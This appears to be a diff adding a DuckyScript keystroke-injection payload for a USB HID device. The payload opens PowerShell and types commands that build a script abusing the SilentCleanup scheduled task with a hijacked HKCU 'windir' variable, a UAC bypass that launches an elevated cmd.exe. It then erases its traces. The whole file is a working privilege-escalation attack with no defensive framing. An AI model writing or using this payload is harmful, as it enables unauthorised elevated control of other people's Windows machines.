@@ -1,0 +1,8 @@
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell.exe -NoExit cd ~;
+ENTER
+DELAY 3000
+STRING '$program = __cmd.exe #__'.Replace('__', [String][Char]34) >> test.ps1; 'Set-ItemProperty -Path __HKCU:\Environment__ -Name __windir__ -Value $program -Force'.Replace('__', [String][Char]34) >> test.ps1; 'Start-Process schtasks.exe -ArgumentList __/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I__'.Replace('__', [String][Char]34) >> test.ps1; 'Start-Sleep 3' >> test.ps1; 'Clear-ItemProperty -Path __HKCU:\Environment__ -Name __windir__ -Force'.Replace('__', [String][Char]34) >> test.ps1; Get-Content test.ps1 | powershell.exe -noprofile -; rm test.ps1;
+ENTER
